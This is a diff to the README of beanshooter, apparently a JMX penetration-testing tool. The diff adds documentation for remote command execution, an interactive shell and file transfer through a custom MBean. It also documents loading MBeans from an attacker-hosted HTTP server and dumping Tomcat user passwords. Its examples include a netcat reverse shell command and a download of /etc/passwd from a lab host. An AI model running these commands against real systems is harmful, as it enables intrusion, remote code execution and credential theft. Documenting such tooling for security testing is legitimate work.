@@ -346,8 +346,8 @@ The `undeploy` action removes the *MBean* with the specified `ObjectName` from t
 ---
 
 In contrast to [basic operations](#basic-operations) that target the general functionality exposed by a *JMX*
-endpoint, *MBean operations* target a specific *MBean*. For each supported *MBean*, *beanshooter* provdides
-antoher subparser containing the available operations and options for the corresponding *MBean*. The following
+endpoint, *MBean operations* target a specific *MBean*. For each supported *MBean*, *beanshooter* provides
+another subparser containing the available operations and options for the corresponding *MBean*. The following
 listing shows an example for the `mlet` *MBean* and the associated subparser:
 
 ```console
@@ -373,7 +373,7 @@ named arguments:
 
 Some *beanshooter* operations are available on each *MBean* and are demonstrated in this section.
 
-#### Info
+#### Generic Info
 
 The `info` action lists some information on the specified *MBean*:
 
@@ -389,7 +389,7 @@ The `Jar File` information indicates whether an implementation of the correspond
 into *beanshooter*. This jar file is used during deployment, if not overwritten using the `--jar-file`
 option.
 
-#### Status
+#### Generic Status
 
 The `status` action checks whether the corresponding *MBean* is already available on the *JMX* service:
 
@@ -398,7 +398,7 @@ The `status` action checks whether the corresponding *MBean* is already availabl
 [+] MBean Status: not deployed
 ```
 
-#### Deploy
+#### Generic Deploy
 
 The `deploy` action works basically like the `deploy` action from the [basic operations](#basic-operations).
 However, since the class name, `ObjectName` and the implementing jar file are all already associated with
@@ -435,7 +435,7 @@ a builtin jar file is available):
 [+] 	MBean with object name MLetTonkaBean:name=TonkaBean,id=1 was successfully deployed
 ```
 
-#### Undeploy
+#### Generic Undeploy
 
 The undeploy action removes the specified *MBean* from a remote *JMX* service:
 
@@ -444,6 +444,187 @@ The undeploy action removes the specified *MBean* from a remote *JMX* service:
 [+] Removing MBean with ObjectName MLetTonkaBean:name=TonkaBean,id=1 from the MBeanServer.
 [+] MBean was successfully removed.
 ```
+
+
+### Tonka
+
+---
+
+The *TonkaBean* is a custom *MBean* that is implemented by the *beanshooter* project and allows
+file system access and command execution on the *JMX* server. Its actions can be accessed by
+using the `tonka` operation, followed by the desired action.
+
+#### Tonka Exec
+
+The `exec` action can be used to invoke a single command on the *JMX* service:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka exec 172.17.0.2 9010 id
+[+] Invoking the executeCommand method with argument: id
+[+] The call was successful
+[+]
+[+] Server response:
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+#### Tonka Background
+
+The `background` action executes a single command on the *JMX* server and does not wait for the command
+to finish:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka background 172.17.0.2 9010 'nc 172.17.0.1 4444 -e ash'
+[+] Invoking the executeCommand method with argument: [Ljava.lang.String;@16293aa2
+[+] The call was successful
+```
+
+#### Tonka Shell
+
+The `shell` action spawns a command shell where you can specify commands that are executed on the *JMX*
+server. The shell is not fully interactive and just represents a wrapper around *Javas* `Runtime.exec`
+method. However, basic support for environment variables and directory changing is implemented:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010 
+[root@172.17.0.2 /]$ id
+uid=0(root) gid=0(root) groups=0(root)
+[root@172.17.0.2 /]$ cd home
+[root@172.17.0.2 /home]$ !env test=example
+[root@172.17.0.2 /home]$ sh -c "echo $test"
+example
+```
+
+The example above demonstrates how to set environment variables using the `!env` keyword. Apart from this
+keyword, several others are available:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010 
+[root@172.17.0.2 /]$ !help
+Available shell commands:
+  <cmd>                        execute the specified command
+  cd <dir>                     change working directory on the server
+  exit|quit                    exit the shell
+  !help                        print this help menu
+  !env <env-str>               set new environment variables in key=value format
+  !upload <src> <dst>          upload a file to the remote MBeanServer
+  !download <src> <dst>        download a file from the remote MBeanServer
+  !background <cmd>            executes the specified command in the background
+```
+
+#### Tonka Upload
+
+The `upload` action can be used to upload a file to the *JMX* server:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka upload 172.17.0.2 9010 ./file.dat /
+[+] Uploading local file /home/qtc/file.dat to path /file.dat on the MBeanSerer.
+[+] 30001 bytes uploaded successfully
+```
+
+#### Tonka Download
+
+The `download` action can be used to download a file from the *JMX* server:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka download 172.17.0.2 9010 /etc/passwd .
+[+] Saving remote file /etc/passwd to local path /home/qtc/passwd
+[+] 1172 bytes were written.
+```
+
+
+### MLet
+
+---
+
+The *MLetMBean* is a well known *MBean* that can be used for loading additional *MBeans* over the
+network. It is already implicitly used by *beanshooter* `deploy` action, but can also be invoked
+manually using the `mlet` operation.
+
+#### MLet Load
+
+The currently only implemented *MLet* operation is the `load` operation that can be used to load
+an *MBean* class from a user specified *URL*:
+
+```console
+[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 tonka http://172.17.0.1:8000
+[+] Starting MBean deployment.
+[+]
+[+] 	Deplyoing MBean: MLet
+[+] 	MBean with object name DefaultDomain:type=MLet was successfully deployed.
+[+]
+[+] Loading MBean from http://172.17.0.1:8000
+[+]
+[+] 	Creating HTTP server on: 172.17.0.1:8000
+[+] 		Creating MLetHandler for endpoint: /
+[+] 		Creating JarHandler for endpoint: /3584de270132420aaf0812366bc46035
+[+] 		Starting HTTP server... 
+[+] 		
+[+] 	Incoming request from: iinsecure.dev
+[+] 	Requested resource: /
+[+] 	Sending mlet:
+[+]
+[+] 		Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 		Archive:   3584de270132420aaf0812366bc46035
+[+] 		Object:    MLetTonkaBean:name=TonkaBean,id=1
+[+] 		Codebase:  http://172.17.0.1:8000
+[+]
+[+] 	Incoming request from: iinsecure.dev
+[+] 	Requested resource: /3584de270132420aaf0812366bc46035
+[+] 	Sending jar file with md5sum: b2f7040f7d8f2d1f40b205d631ff7356
+[+]
+[+] MBean was loaded successfully.
+```
+
+The example above demonstrates how the *TonkaBean* can be loaded using the `mlet` operation. If you want
+to load a custom *MBean*, you need to specify `custom` instead of `tonka` and supply the `--class-name`,
+`--object-name` and `--jar-file` options:
+
+```console
+[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 custom http://172.17.0.1:8000 --class-name de.qtc.beanshooter.tonkabean.TonkaBean --object-name MLetTonkaBean:name=TonkaBean,id=2 --jar-file www/tonka-bean.jar
+[+] Starting MBean deployment.
+[+] ...
+[+] MBean was loaded successfully.
+```
+
+
+### Tomcat
+
+---
+
+The `tomcat` operation interacts with the `MemoryUserDatabaseMBean` of *Apache tomcat*. This *MBean* provides access to user
+accounts that are available on a *tomcat* service.
+
+#### Tomcat List
+
+The currently only implemented operation is `list`, which lists available user accounts:
+
+```console
+[qtc@devbox ~]$ beanshooter tomcat list 172.17.0.2 1090
+[+] Listing tomcat users:
+[+]
+[+] 	----------------------------------------
+[+] 	Username:  manager
+[+] 	Password:  P@55w0rD#
+[+] 	Roles:
+[+] 		   Users:type=Role,rolename="manager-gui",database=UserDatabase
+[+] 		   Users:type=Role,rolename="manager-script",database=UserDatabase
+[+] 		   Users:type=Role,rolename="manager-jmx",database=UserDatabase
+[+] 		   Users:type=Role,rolename="manager-status",database=UserDatabase
+[+]
+[+] 	----------------------------------------
+[+] 	Username:  admin
+[+] 	Password:  s3cr3T!$
+[+] 	Roles:
+[+] 		   Users:type=Role,rolename="admin-gui",database=UserDatabase
+[+] 		   Users:type=Role,rolename="admin-script",database=UserDatabase
+[+]
+[+] 	----------------------------------------
+[+] 	Username:  status
+[+] 	Password:  cr@cKM3o.O
+[+] 	Roles:
+[+] 		   Users:type=Role,rolename="manager-status",database=UserDatabase
+```
+
 
 ### JMXMP
 
